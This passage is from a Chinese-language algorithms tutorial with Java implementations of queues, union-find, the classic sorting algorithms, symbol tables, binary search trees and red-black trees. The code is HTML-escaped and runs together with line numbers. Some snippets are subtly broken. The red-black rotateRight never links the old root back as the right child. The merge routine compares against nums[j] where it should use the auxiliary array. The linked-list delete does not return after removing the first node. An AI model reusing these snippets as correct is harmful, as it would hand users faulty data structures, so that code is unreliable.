cur.next; return item; &#125; &#125;; &#125;&#125; 队列First-In-First-Out 下面是队列的链表实现，需要维护 first 和 last 节点指针，分别指向队首和队尾。 这里需要考虑 first 和 last 指针哪个作为链表的开头。因为出队列操作需要让队首元素的下一个元素成为队首，所以需要容易获取下一个元素，而链表的头部节点的 next 指针指向下一个元素，因此可以让 first 指针链表的开头。 123456789public interface MyQueue&lt;Item&gt; extends Iterable&lt;Item&gt; &#123; int size(); boolean isEmpty(); MyQueue&lt;Item&gt; add(Item item); Item remove() throws Exception;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667public class ListQueue&lt;Item&gt; implements MyQueue&lt;Item&gt; &#123; private Node first; private Node last; int N = 0; private class Node &#123; Item item; Node next; &#125; @Override public boolean isEmpty() &#123; return N == 0; &#125; @Override public int size() &#123; return N; &#125; @Override public MyQueue&lt;Item&gt; add(Item item) &#123; Node newNode = new Node(); newNode.item = item; newNode.next = null; if (isEmpty()) &#123; last = newNode; first = newNode; &#125; else &#123; last.next = newNode; last = newNode; &#125; N++; return this; &#125; @Override public Item remove() throws Exception &#123; if (isEmpty()) throw new Exception("queue is empty"); Node node = first; first = first.next; N--; if (isEmpty()) last = null; return node.item; &#125; @Override public Iterator&lt;Item&gt; iterator() &#123; return new Iterator&lt;Item&gt;() &#123; Node cur = first; @Override public boolean hasNext() &#123; return cur != null; &#125; @Override public Item next() &#123; Item item = cur.item; cur = cur.next; return item; &#125; &#125;; &#125;&#125; 四、并查集用于解决动态连通性问题，能动态连接两个点，并且判断两个点是否连通。 方法 描述 UF(int N) 构造一个大小为 N 的并查集 void union(int p, int q) 连接 p 和 q 节点 int find(int p) 查找 p 所在的连通分量 boolean connected(int p, int q) 判断 p 和 q 节点是否连通 1234567891011121314151617public abstract class UF &#123; protected int[] id; public UF(int N) &#123; id = new int[N]; for (int i = 0; i &lt; N; i++) id[i] = i; &#125; public boolean connected(int p, int q) &#123; return find(p) == find(q); &#125; public abstract int find(int p); public abstract void union(int p, int q);&#125; quick-find可以快速进行 find 操作，即可以快速判断两个节点是否连通。 同一连通分量的所有节点的 id 值相等。 但是 union 操作代价却很高，需要将其中一个连通分量中的所有节点 id 值都修改为另一个节点的 id 值。 1234567891011121314151617181920212223public class QuickFindUF extends UF &#123; public QuickFindUF(int N) &#123; super(N); &#125; @Override public int find(int p) &#123; return id[p]; &#125; @Override public void union(int p, int q) &#123; int pID = find(p); int qID = find(q); if (pID == qID) return; for (int i = 0; i &lt; id.length; i++) if (id[i] == pID) id[i] = qID; &#125;&#125; quick-union可以快速进行 union 操作，只需要修改一个节点的 id 值即可。 但是 find 操作开销很大，因为同一个连通分量的节点 id 值不同，id 值只是用来指向另一个节点。因此需要一直向上查找操作，直到找到最上层的节点。 1234567891011121314151617181920public class QuickUnionUF extends UF &#123; public QuickUnionUF(int N) &#123; super(N); &#125; @Override public int find(int p) &#123; while (p != id[p]) p = id[p]; return p; &#125; @Override public void union(int p, int q) &#123; int pRoot = find(p); int qRoot = find(q); if (pRoot != qRoot) id[pRoot] = qRoot; &#125;&#125; 这种方法可以快速进行 union 操作，但是 find 操作和树高成正比，最坏的情况下树的高度为触点的数目。 加权 quick-union为了解决 quick-union 的树通常会很高的问题，加权 quick-union 在 union 操作时会让较小的树连接较大的树上面。 理论研究证明，加权 quick-union 算法构造的树深度最多不超过 logN。 123456789101112131415161718192021222324252627282930313233public class WeightedQuickUnionUF extends UF &#123; // 保存节点的数量信息 private int[] sz; public WeightedQuickUnionUF(int N) &#123; super(N); this.sz = new int[N]; for (int i = 0; i &lt; N; i++) this.sz[i] = 1; &#125; @Override public int find(int p) &#123; while (p != id[p]) p = id[p]; return p; &#125; @Override public void union(int p, int q) &#123; int i = find(p); int j = find(q); if (i == j) return; if (sz[i] &lt; sz[j]) &#123; id[i] = j; sz[j] += sz[i]; &#125; else &#123; id[j] = i; sz[i] += sz[j]; &#125; &#125;&#125; 路径压缩的加权 quick-union在检查节点的同时将它们直接链接到根节点，只需要在 find 中添加一个循环即可。 各种 union-find 算法的比较 算法 union find quick-find N 1 quick-union 树高 树高 加权 quick-union logN logN 路径压缩的加权 quick-union 非常接近 1 非常接近 1 五、排序待排序的元素需要实现 Java 的 Comparable 接口，该接口有 compareTo() 方法，可以用它来判断两个元素的大小关系。 研究排序算法的成本模型时，计算的是比较和交换的次数。 使用辅助函数 less() 和 swap() 来进行比较和交换的操作，使得代码的可读性和可移植性更好。 1234567891011121314public abstract class Sort&lt;T extends Comparable&lt;T&gt;&gt; &#123; public abstract void sort(T[] nums); protected boolean less(T v, T w) &#123; return v.compareTo(w) &lt; 0; &#125; protected void swap(T[] a, int i, int j) &#123; T t = a[i]; a[i] = a[j]; a[j] = t; &#125;&#125; 选择排序选择出数组中的最小元素，将它与数组的第一个元素交换位置。再从剩下的元素中选择出最小的元素，将它与数组的第二个元素交换位置。不断进行这样的操作，直到将整个数组排序。 12345678910111213public class Selection&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; &#123; @Override public void sort(T[] nums) &#123; int N = nums.length; for (int i = 0; i &lt; N; i++) &#123; int min = i; for (int j = i + 1; j &lt; N; j++) if (less(nums[j], nums[min])) min = j; swap(nums, i, min); &#125; &#125;&#125; 选择排序需要 \N2/2 次比较和 \N 次交换，它的运行时间与输入无关，这个特点使得它对一个已经排序的数组也需要这么多的比较和交换操作。 冒泡排序通过从左到右不断交换相邻逆序的相邻元素，在一轮的交换之后，可以让未排序的元素上浮到右侧。 在一轮循环中，如果没有发生交换，就说明数组已经是有序的，此时可以直接退出。 12345678910111213141516public class Bubble&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; &#123; @Override public void sort(T[] nums) &#123; int N = nums.length; boolean hasSorted = false; for (int i = 0; i &lt; N &amp;&amp; !hasSorted; i++) &#123; hasSorted = true; for (int j = 0; j &lt; N - i - 1; j++) &#123; if (less(nums[j + 1], nums[j])) &#123; hasSorted = false; swap(nums, j, j + 1); &#125; &#125; &#125; &#125;&#125; 插入排序插入排序从左到右进行，每次都将当前元素插入到左侧已经排序的数组中，使得插入之后左部数组依然有序。 第 j 元素是通过不断向左比较并交换来实现插入过程：当第 j 元素小于第 j - 1 元素，就将它们的位置交换，然后令 j 指针向左移动一个位置，不断进行以上操作。 123456789public class Insertion&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; &#123; @Override public void sort(T[] nums) &#123; int N = nums.length; for (int i = 1; i &lt; N; i++) for (int j = i; j &gt; 0 &amp;&amp; less(nums[j], nums[j - 1]); j--) swap(nums, j, j - 1); &#125;&#125; 对于数组 {3, 5, 2, 4, 1}，它具有以下逆序：(3, 2), (3, 1), (5, 2), (5, 4), (5, 1), (2, 1), (4, 1)，插入排序每次只能交换相邻元素，令逆序数量减少 1，因此插入排序需要交换的次数为逆序数量。 插入排序的复杂度取决于数组的初始顺序，如果数组已经部分有序了，逆序较少，那么插入排序会很快。 平均情况下插入排序需要 \N2/4 比较以及 \N2/4 次交换； 最坏的情况下需要 \N2/2 比较以及 \N2/2 次交换，最坏的情况是数组是倒序的； 最好的情况下需要 N-1 次比较和 0 次交换，最好的情况就是数组已经有序了。 希尔排序对于大规模的数组，插入排序很慢，因为它只能交换相邻的元素，每次只能将逆序数量减少 1。 希尔排序的出现就是为了改进插入排序的这种局限性，它通过交换不相邻的元素，每次可以将逆序数量减少大于 1。 希尔排序使用插入排序对间隔 h 的序列进行排序。通过不断减小 h，最后令 h=1，就可以使得整个数组是有序的。 12345678910111213141516public class Shell&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; &#123; @Override public void sort(T[] nums) &#123; int N = nums.length; int h = 1; while (h &lt; N / 3) h = 3 * h + 1; // 1, 4, 13, 40, ... while (h &gt;= 1) &#123; for (int i = h; i &lt; N; i++) for (int j = i; j &gt;= h &amp;&amp; less(nums[j], nums[j - h]); j -= h) swap(nums, j, j - h); h = h / 3; &#125; &#125;&#125; 希尔排序的运行时间达不到平方级别，使用递增序列 1, 4, 13, 40, … 的希尔排序所需要的比较次数不会超过 N 的若干倍乘于递增序列的长度。后面介绍的高级排序算法只会比希尔排序快两倍左右。 归并排序归并排序的思想是将数组分成两部分，分别进行排序，然后归并起来。 1. 归并方法归并方法将数组中两个已经排序的部分归并成一个。 12345678910111213141516171819202122public abstract class MergeSort&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; &#123; protected T[] aux; protected void merge(T[] nums, int l, int m, int h) &#123; int i = l, j = m + 1; for (int k = l; k &lt;= h; k++) aux[k] = nums[k]; // 将数据复制到辅助数组 for (int k = l; k &lt;= h; k++) &#123; if (i &gt; m) nums[k] = aux[j++]; else if (j &gt; h) nums[k] = aux[i++]; else if (aux[i].compareTo(nums[j]) &lt;= 0) nums[k] = aux[i++]; // 先进行这一步，保证稳定性 else nums[k] = aux[j++]; &#125; &#125;&#125; 2. 自顶向下归并排序 12345678910111213141516public class Up2DownMergeSort&lt;T extends Comparable&lt;T&gt;&gt; extends MergeSort&lt;T&gt; &#123; @Override public void sort(T[] nums) &#123; aux = (T[]) new Comparable[nums.length]; sort(nums, 0, nums.length - 1); &#125; private void sort(T[] nums, int l, int h) &#123; if (h &lt;= l) return; int mid = l + (h - l) / 2; sort(nums, l, mid); sort(nums, mid + 1, h); merge(nums, l, mid, h); &#125;&#125; 因为每次都将问题对半分成两个子问题，而这种对半分的算法复杂度一般为 O(NlogN)，因此该归并排序方法的时间复杂度也为 O(NlogN)。 3. 自底向上归并排序先归并那些微型数组，然后成对归并得到的微型数组。 12345678910public class Down2UpMergeSort&lt;T extends Comparable&lt;T&gt;&gt; extends MergeSort&lt;T&gt; &#123; @Override public void sort(T[] nums) &#123; int N = nums.length; aux = (T[]) new Comparable[N]; for (int sz = 1; sz &lt; N; sz += sz) for (int lo = 0; lo &lt; N - sz; lo += sz + sz) merge(nums, lo, lo + sz - 1, Math.min(lo + sz + sz - 1, N - 1)); &#125;&#125; 快速排序1. 基本算法 归并排序将数组分为两个子数组分别排序，并将有序的子数组归并使得整个数组排序； 快速排序通过一个切分元素将数组分为两个子数组，左子数组小于等于切分元素，右子数组大于等于切分元素，将这两个子数组排序也就将整个数组排序了。 123456789101112131415161718192021public class QuickSort&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; &#123; @Override public void sort(T[] nums) &#123; shuffle(nums); sort(nums, 0, nums.length - 1); &#125; private void sort(T[] nums, int l, int h) &#123; if (h &lt;= l) return; int j = partition(nums, l, h); sort(nums, l, j - 1); sort(nums, j + 1, h); &#125; private void shuffle(T[] nums) &#123; List&lt;Comparable&gt; list = Arrays.asList(nums); Collections.shuffle(list); list.toArray(nums); &#125;&#125; 2. 切分取 a[lo] 作为切分元素，然后从数组的左端向右扫描直到找到第一个大于等于它的元素，再从数组的右端向左扫描找到第一个小于等于它的元素，交换这两个元素，并不断进行这个过程，就可以保证左指针 i 的左侧元素都不大于切分元素，右指针 j 的右侧元素都不小于切分元素。当两个指针相遇时，将切分元素 a[lo] 和 a[j] 交换位置。 12345678910111213private int partition(T[] nums, int l, int h) &#123; int i = l, j = h + 1; T v = nums[l]; while (true) &#123; while (less(nums[++i], v) &amp;&amp; i != h) ; while (less(v, nums[--j]) &amp;&amp; j != l) ; if (i &gt;= j) break; swap(nums, i, j); &#125; swap(nums, l, j); return j;&#125; 3. 性能分析快速排序是原地排序，不需要辅助数组，但是递归调用需要辅助栈。 快速排序最好的情况下是每次都正好能将数组对半分，这样递归调用次数才是最少的。这种情况下比较次数为 CN=2CN/2+N，复杂度为 O(NlogN)。 最坏的情况下，第一次从最小的元素切分，第二次从第二小的元素切分，如此这般。因此最坏的情况下需要比较 N2/2。为了防止数组最开始就是有序的，在进行快速排序时需要随机打乱数组。 4. 算法改进（一）切换到插入排序 因为快速排序在小数组中也会递归调用自己，对于小数组，插入排序比快速排序的性能更好，因此在小数组中可以切换到插入排序。 （二）三数取中 最好的情况下是每次都能取数组的中位数作为切分元素，但是计算中位数的代价很高。人们发现取 3 个元素并将大小居中的元素作为切分元素的效果最好。 （三）三向切分 对于有大量重复元素的数组，可以将数组切分为三部分，分别对应小于、等于和大于切分元素。 三向切分快速排序对于只有若干不同主键的随机数组可以在线性时间内完成排序。 1234567891011121314151617181920public class ThreeWayQuickSort&lt;T extends Comparable&lt;T&gt;&gt; extends QuickSort&lt;T&gt; &#123; @Override protected void sort(T[] nums, int l, int h) &#123; if (h &lt;= l) return; int lt = l, i = l + 1, gt = h; T v = nums[l]; while (i &lt;= gt) &#123; int cmp = nums[i].compareTo(v); if (cmp &lt; 0) swap(nums, lt++, i++); else if (cmp &gt; 0) swap(nums, i, gt--); else i++; &#125; sort(nums, l, lt - 1); sort(nums, gt + 1, h); &#125;&#125; 5. 基于切分的快速选择算法快速排序的 partition() 方法，会返回一个整数 j 使得 a[l..j-1] 小于等于 a[j]，且 a[j+1..h] 大于等于 a[j]，此时 a[j] 就是数组的第 j 大元素。 可以利用这个特性找出数组的第 k 个元素。 12345678910111213public T select(T[] nums, int k) &#123; int l = 0, h = nums.length - 1; while (h &gt; l) &#123; int j = partition(nums, l, h); if (j == k) return nums[k]; else if (j &gt; k) h = j - 1; else l = j + 1; &#125; return nums[k];&#125; 该算法是线性级别的。因为每次能将数组二分，那么比较的总次数为 (N+N/2+N/4+..)，直到找到第 k 个元素，这个和显然小于 2N。 堆排序1. 堆堆的某个节点的值总是大于等于子节点的值，并且堆是一颗完全二叉树。 堆可以用数组来表示，因为堆是完全二叉树，而完全二叉树很容易就存储在数组中。位置 k 的节点的父节点位置为 k/2，而它的两个子节点的位置分别为 2k 和 2k+1。这里不使用数组索引为 0 的位置，是为了更清晰地描述节点的位置关系。 123456789101112131415161718192021222324252627public class Heap&lt;T extends Comparable&lt;T&gt;&gt; &#123; private T[] heap; private int N = 0; public Heap(int maxN) &#123; this.heap = (T[]) new Comparable[maxN + 1]; &#125; public boolean isEmpty() &#123; return N == 0; &#125; public int size() &#123; return N; &#125; private boolean less(int i, int j) &#123; return heap[i].compareTo(heap[j]) &lt; 0; &#125; private void swap(int i, int j) &#123; T t = heap[i]; heap[i] = heap[j]; heap[j] = t; &#125;&#125; 2. 上浮和下沉在堆中，当一个节点比父节点大，那么需要交换这个两个节点。交换后还可能比它新的父节点大，因此需要不断地进行比较和交换操作，把这种操作称为上浮。 123456private void swim(int k) &#123; while (k &gt; 1 &amp;&amp; less(k / 2, k)) &#123; swap(k / 2, k); k = k / 2; &#125;&#125; 类似地，当一个节点比子节点来得小，也需要不断地向下进行比较和交换操作，把这种操作称为下沉。一个节点如果有两个子节点，应当与两个子节点中最大那么节点进行交换。 1234567891011private void sink(int k) &#123; while (2 * k &lt;= N) &#123; int j = 2 * k; if (j &lt; N &amp;&amp; less(j, j + 1)) j++; if (!less(k, j)) break; swap(k, j); k = j; &#125;&#125; 3. 插入元素将新元素放到数组末尾，然后上浮到合适的位置。 1234public void insert(Comparable v) &#123; heap[++N] = v; swim(N);&#125; 4. 删除最大元素从数组顶端删除最大的元素，并将数组的最后一个元素放到顶端，并让这个元素下沉到合适的位置。 1234567public T delMax() &#123; T max = heap[1]; swap(1, N--); heap[N + 1] = null; sink(1); return max;&#125; 5. 堆排序由于堆可以很容易得到最大的元素并删除它，不断地进行这种操作可以得到一个递减序列。如果把最大元素和当前堆中数组的最后一个元素交换位置，并且不删除它，那么就可以得到一个从尾到头的递减序列，从正向来看就是一个递增序列。因此很容易使用堆来进行排序。并且堆排序是原地排序，不占用额外空间。 （一）构建堆 无序数组建立堆最直接的方法是从左到右遍历数组，然后进行上浮操作。一个更高效的方法是从右至左进行下沉操作，如果一个节点的两个节点都已经是堆有序，那么进行下沉操作可以使得这个节点为根节点的堆有序。叶子节点不需要进行下沉操作，可以忽略叶子节点的元素，因此只需要遍历一半的元素即可。 （二）交换堆顶元素与最后一个元素 交换之后需要进行下沉操作维持堆的有序状态。 1234567891011121314151617181920212223242526272829303132public class HeapSort&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; &#123; /** * 数组第 0 个位置不能有元素 */ @Override public void sort(T[] nums) &#123; int N = nums.length - 1; for (int k = N / 2; k &gt;= 1; k--) sink(nums, k, N); while (N &gt; 1) &#123; swap(nums, 1, N--); sink(nums, 1, N); &#125; &#125; private void sink(T[] nums, int k, int N) &#123; while (2 * k &lt;= N) &#123; int j = 2 * k; if (j &lt; N &amp;&amp; less(nums, j, j + 1)) j++; if (!less(nums, k, j)) break; swap(nums, k, j); k = j; &#125; &#125; private boolean less(T[] nums, int i, int j) &#123; return nums[i].compareTo(nums[j]) &lt; 0; &#125;&#125; 6. 分析一个堆的高度为 logN，因此在堆中插入元素和删除最大元素的复杂度都为 logN。 对于堆排序，由于要对 N 个节点进行下沉操作，因此复杂度为 NlogN。 堆排序时一种原地排序，没有利用额外的空间。 现代操作系统很少使用堆排序，因为它无法利用局部性原理进行缓存，也就是数组元素很少和相邻的元素进行比较。 小结1. 排序算法的比较 算法 稳定 时间复杂度 空间复杂度 备注 选择排序 no N2 1 冒泡排序 yes N2 1 插入排序 yes N ~ N2 1 时间复杂度和初始顺序有关 希尔排序 no N 的若干倍乘于递增序列的长度 1 快速排序 no NlogN logN 三向切分快速排序 no N ~ NlogN logN 适用于有大量重复主键 归并排序 yes NlogN N 堆排序 no NlogN 1 快速排序是最快的通用排序算法，它的内循环的指令很少，而且它还能利用缓存，因为它总是顺序地访问数据。它的运行时间近似为 ~cNlogN，这里的 c 比其他线性对数级别的排序算法都要小。使用三向切分快速排序，实际应用中可能出现的某些分布的输入能够达到线性级别，而其它排序算法仍然需要线性对数时间。 2. Java 的排序算法实现Java 主要排序方法为 java.util.Arrays.sort()，对于原始数据类型使用三向切分的快速排序，对于引用类型使用归并排序。 六、查找符号表（Symbol Table）是一种存储键值对的数据结构，可以支持快速查找操作。 符号表分为有序和无序两种，有序符号表主要指支持 min()、max() 等根据键的大小关系来实现的操作。 有序符号表的键需要实现 Comparable 接口。 12345678910public interface UnorderedST&lt;Key, Value&gt; &#123; int size(); Value get(Key key); void put(Key key, Value value); void delete(Key key);&#125; 12345678910111213141516public interface OrderedST&lt;Key extends Comparable&lt;Key&gt;, Value&gt; &#123; int size(); void put(Key key, Value value); Value get(Key key); Key min(); Key max(); int rank(Key key); List&lt;Key&gt; keys(Key l, Key h);&#125; 链表实现无序符号表12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970public class ListUnorderedST&lt;Key, Value&gt; implements UnorderedST&lt;Key, Value&gt; &#123; private Node first; private class Node &#123; Key key; Value value; Node next; Node(Key key, Value value, Node next) &#123; this.key = key; this.value = value; this.next = next; &#125; &#125; @Override public int size() &#123; int cnt = 0; Node cur = first; while (cur != null) &#123; cnt++; cur = cur.next; &#125; return cnt; &#125; @Override public void put(Key key, Value value) &#123; Node cur = first; // 如果在链表中找到节点的键等于 key 就更新这个节点的值为 value while (cur != null) &#123; if (cur.key.equals(key)) &#123; cur.value = value; return; &#125; cur = cur.next; &#125; // 否则使用头插法插入一个新节点 first = new Node(key, value, first); &#125; @Override public void delete(Key key) &#123; if (first == null) return; if (first.key.equals(key)) first = first.next; Node pre = first, cur = first.next; while (cur != null) &#123; if (cur.key.equals(key)) &#123; pre.next = cur.next; return; &#125; pre = pre.next; cur = cur.next; &#125; &#125; @Override public Value get(Key key) &#123; Node cur = first; while (cur != null) &#123; if (cur.key.equals(key)) return cur.value; cur = cur.next; &#125; return null; &#125;&#125; 二分查找实现有序符号表使用一对平行数组，一个存储键一个存储值。 rank() 方法至关重要，当键在表中时，它能够知道该键的位置；当键不在表中时，它也能知道在何处插入新键。 复杂度：二分查找最多需要 logN+1 次比较，使用二分查找实现的符号表的查找操作所需要的时间最多是对数级别的。但是插入操作需要移动数组元素，是线性级别的。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879public class BinarySearchOrderedST&lt;Key extends Comparable&lt;Key&gt;, Value&gt; implements OrderedST&lt;Key, Value&gt; &#123; private Key[] keys; private Value[] values; private int N = 0; public BinarySearchOrderedST(int capacity) &#123; keys = (Key[]) new Comparable[capacity]; values = (Value[]) new Object[capacity]; &#125; @Override public int size() &#123; return N; &#125; @Override public int rank(Key key) &#123; int l = 0, h = N - 1; while (l &lt;= h) &#123; int m = l + (h - l) / 2; int cmp = key.compareTo(keys[m]); if (cmp == 0) return m; else if (cmp &lt; 0) h = m - 1; else l = m + 1; &#125; return l; &#125; @Override public List&lt;Key&gt; keys(Key l, Key h) &#123; int index = rank(l); List&lt;Key&gt; list = new ArrayList&lt;&gt;(); while (keys[index].compareTo(h) &lt;= 0) &#123; list.add(keys[index]); index++; &#125; return list; &#125; @Override public void put(Key key, Value value) &#123; int index = rank(key); // 如果找到已经存在的节点键位 key，就更新这个节点的值为 value if (index &lt; N &amp;&amp; keys[index].compareTo(key) == 0) &#123; values[index] = value; return; &#125; // 否则在数组中插入新的节点，需要先将插入位置之后的元素都向后移动一个位置 for (int j = N; j &gt; index; j--) &#123; keys[j] = keys[j - 1]; values[j] = values[j - 1]; &#125; keys[index] = key; values[index] = value; N++; &#125; @Override public Value get(Key key) &#123; int index = rank(key); if (index &lt; N &amp;&amp; keys[index].compareTo(key) == 0) return values[index]; return null; &#125; @Override public Key min() &#123; return keys[0]; &#125; @Override public Key max() &#123; return keys[N - 1]; &#125;&#125; 二叉查找树二叉树 是一个空链接，或者是一个有左右两个链接的节点，每个链接都指向一颗子二叉树。 二叉查找树 （BST）是一颗二叉树，并且每个节点的值都大于等于其左子树中的所有节点的值而小于等于右子树的所有节点的值。 BST 有一个重要性质，就是它的中序遍历结果递增排序。 基本数据结构： 123456789101112131415161718192021222324252627282930313233343536public class BST&lt;Key extends Comparable&lt;Key&gt;, Value&gt; implements OrderedST&lt;Key, Value&gt; &#123; protected Node root; protected class Node &#123; Key key; Value val; Node left; Node right; // 以该节点为根的子树节点总数 int N; // 红黑树中使用 boolean color; Node(Key key, Value val, int N) &#123; this.key = key; this.val = val; this.N = N; &#125; &#125; @Override public int size() &#123; return size(root); &#125; private int size(Node x) &#123; if (x == null) return 0; return x.N; &#125; protected void recalculateSize(Node x) &#123; x.N = size(x.left) + size(x.right) + 1; &#125;&#125; （为了方便绘图，二叉树的空链接不画出来。） 1. get() 如果树是空的，则查找未命中； 如果被查找的键和根节点的键相等，查找命中； 否则递归地在子树中查找：如果被查找的键较小就在左子树中查找，较大就在右子树中查找。 12345678910111213141516@Overridepublic Value get(Key key) &#123; return get(root, key);&#125;private Value get(Node x, Key key) &#123; if (x == null) return null; int cmp = key.compareTo(x.key); if (cmp == 0) return x.val; else if (cmp &lt; 0) return get(x.left, key); else return get(x.right, key);&#125; 2. put()当插入的键不存在于树中，需要创建一个新节点，并且更新上层节点的链接使得该节点正确链接到树中。 123456789101112131415161718 @Overridepublic void put(Key key, Value value) &#123; root = put(root, key, value);&#125;private Node put(Node x, Key key, Value value) &#123; if (x == null) return new Node(key, value, 1); int cmp = key.compareTo(x.key); if (cmp == 0) x.val = value; else if (cmp &lt; 0) x.left = put(x.left, key, value); else x.right = put(x.right, key, value); recalculateSize(x); return x;&#125; 3. 分析二叉查找树的算法运行时间取决于树的形状，而树的形状又取决于键被插入的先后顺序。最好的情况下树是完全平衡的，每条空链接和根节点的距离都为 logN。 在最坏的情况下，树的高度为 N。 4. floor()floor(key)：小于等于键的最大键 如果键小于根节点的键，那么 floor(key) 一定在左子树中； 如果键大于根节点的键，需要先判断右子树中是否存在 floor(key)，如果存在就找到，否则根节点就是 floor(key)。 123456789101112131415161718public Key floor(Key key) &#123; Node x = floor(root, key); if (x == null) return null; return x.key;&#125;private Node floor(Node x, Key key) &#123; if (x == null) return null; int cmp = key.compareTo(x.key); if (cmp == 0) return x; if (cmp &lt; 0) return floor(x.left, key); Node t = floor(x.right, key); return t != null ? t : x;&#125; 5. rank()rank(key) 返回 key 的排名。 如果键和根节点的键相等，返回左子树的节点数； 如果小于，递归计算在左子树中的排名； 如果大于，递归计算在右子树中的排名，并加上左子树的节点数，再加上 1（根节点）。 12345678910111213141516@Overridepublic int rank(Key key) &#123; return rank(key, root);&#125;private int rank(Key key, Node x) &#123; if (x == null) return 0; int cmp = key.compareTo(x.key); if (cmp == 0) return size(x.left); else if (cmp &lt; 0) return rank(key, x.left); else return 1 + size(x.left) + rank(key, x.right);&#125; 6. min()123456789101112@Overridepublic Key min() &#123; return min(root).key;&#125;private Node min(Node x) &#123; if (x == null) return null; if (x.left == null) return x; return min(x.left);&#125; 7. deleteMin()令指向最小节点的链接指向最小节点的右子树。 1234567891011public void deleteMin() &#123; root = deleteMin(root);&#125;public Node deleteMin(Node x) &#123; if (x.left == null) return x.right; x.left = deleteMin(x.left); recalculateSize(x); return x;&#125; 8. delete() 如果待删除的节点只有一个子树，那么只需要让指向待删除节点的链接指向唯一的子树即可； 否则，让右子树的最小节点替换该节点。 123456789101112131415161718192021222324public void delete(Key key) &#123; root = delete(root, key);&#125;private Node delete(Node x, Key key) &#123; if (x == null) return null; int cmp = key.compareTo(x.key); if (cmp &lt; 0) x.left = delete(x.left, key); else if (cmp &gt; 0) x.right = delete(x.right, key); else &#123; if (x.right == null) return x.left; if (x.left == null) return x.right; Node t = x; x = min(t.right); x.right = deleteMin(t.right); x.left = t.left; &#125; recalculateSize(x); return x;&#125; 9. keys()利用二叉查找树中序遍历的结果为递增的特点。 12345678910111213141516171819@Overridepublic List&lt;Key&gt; keys(Key l, Key h) &#123; return keys(root, l, h);&#125;private List&lt;Key&gt; keys(Node x, Key l, Key h) &#123; List&lt;Key&gt; list = new ArrayList&lt;&gt;(); if (x == null) return list; int cmpL = l.compareTo(x.key); int cmpH = h.compareTo(x.key); if (cmpL &lt; 0) list.addAll(keys(x.left, l, h)); if (cmpL &lt;= 0 &amp;&amp; cmpH &gt;= 0) list.add(x.key); if (cmpH &gt; 0) list.addAll(keys(x.right, l, h)); return list;&#125; 10. 性能分析复杂度：二叉查找树所有操作在最坏的情况下所需要的时间都和树的高度成正比。 2-3 查找树 2-3 查找树引入了 2- 节点和 3- 节点，目的是为了让树平衡。一颗完美平衡的 2-3 查找树的所有空链接到根节点的距离应该是相同的。 1. 插入操作插入操作和 BST 的插入操作有很大区别，BST 的插入操作是先进行一次未命中的查找，然后再将节点插入到对应的空链接上。但是 2-3 查找树如果也这么做的话，那么就会破坏了平衡性。它是将新节点插入到叶子节点上。 根据叶子节点的类型不同，有不同的处理方式： 如果插入到 2- 节点上，那么直接将新节点和原来的节点组成 3- 节点即可。 如果是插入到 3- 节点上，就会产生一个临时 4- 节点时，需要将 4- 节点分裂成 3 个 2- 节点，并将中间的 2- 节点移到上层节点中。如果上移操作继续产生临时 4- 节点则一直进行分裂上移，直到不存在临时 4- 节点。 2. 性质2-3 查找树插入操作的变换都是局部的，除了相关的节点和链接之外不必修改或者检查树的其它部分，而这些局部变换不会影响树的全局有序性和平衡性。 2-3 查找树的查找和插入操作复杂度和插入顺序无关，在最坏的情况下查找和插入操作访问的节点必然不超过 logN 个，含有 10 亿个节点的 2-3 查找树最多只需要访问 30 个节点就能进行任意的查找和插入操作。 红黑树2-3 查找树需要用到 2- 节点和 3- 节点，红黑树使用红链接来实现 3- 节点。指向一个节点的链接颜色如果为红色，那么这个节点和上层节点表示的是一个 3- 节点，而黑色则是普通链接。 红黑树具有以下性质： 红链接都为左链接； 完美黑色平衡，即任意空链接到根节点的路径上的黑链接数量相同。 画红黑树时可以将红链接画平。 12345678910public class RedBlackBST&lt;Key extends Comparable&lt;Key&gt;, Value&gt; extends BST&lt;Key, Value&gt; &#123; private static final boolean RED = true; private static final boolean BLACK = false; private boolean isRed(Node x) &#123; if (x == null) return false; return x.color == RED; &#125;&#125; 1. 左旋转因为合法的红链接都为左链接，如果出现右链接为红链接，那么就需要进行左旋转操作。 12345678910public Node rotateLeft(Node h) &#123; Node x = h.right; h.right = x.left; x.left = h; x.color = h.color; h.color = RED; x.N = h.N; recalculateSize(h); return x;&#125; 2. 右旋转进行右旋转是为了转换两个连续的左红链接，这会在之后的插入过程中探讨。 123456789public Node rotateRight(Node h) &#123; Node x = h.left; h.left = x.right; x.color = h.color; h.color = RED; x.N = h.N; recalculateSize(h); return x;&#125; 3. 颜色转换一个 4- 节点在红黑树中表现为一个节点的左右子节点都是红色的。分裂 4- 节点除了需要将子节点的颜色由红变黑之外，同时需要将父节点的颜色由黑变红，从 2-3 树的角度看就是将中间节点移到上层节点。 12345void flipColors(Node h) &#123; h.color = RED; h.left.color = BLACK; h.right.color = BLACK;&#125; 4. 插入先将一个节点按二叉查找树的方法插入到正确位置，然后再进行如下颜色操作： 如果右子节点是红色的而左子节点是黑色的，进行左旋转； 如果左子节点是红色的，而且左子节点的左子节点也是红色的，进行右旋转； 如果左右子节点均为红色的，进行颜色转换。 123456789101112131415161718192021222324252627282930@Overridepublic void put(Key key, Value value) &#123; root = put(root, key, value); root.color = BLACK;&#125;private Node put(Node x, Key key, Value value) &#123; if (x == null) &#123; Node node = new Node(key, value, 1); node.color = RED; return node; &#125; int cmp = key.compareTo(x.key); if (cmp == 0) x.val = value; else if (cmp &lt; 0) x.left = put(x.left, key, value); else x.right = put(x.right, key, value); if (isRed(x.right) &amp;&amp; !isRed(x.left)) x = rotateLeft(x); if (isRed(x.left) &amp;&amp; isRed(x.left.left)) x = rotateRight(x); if (isRed(x.left) &amp;&amp; isRed(x.right)) flipColors(x); recalculateSize(x); return x;&#125; 可以看到该插入操作和二叉查找树的插入操作类似，只是在最后加入了旋转和颜色变换操作即可。 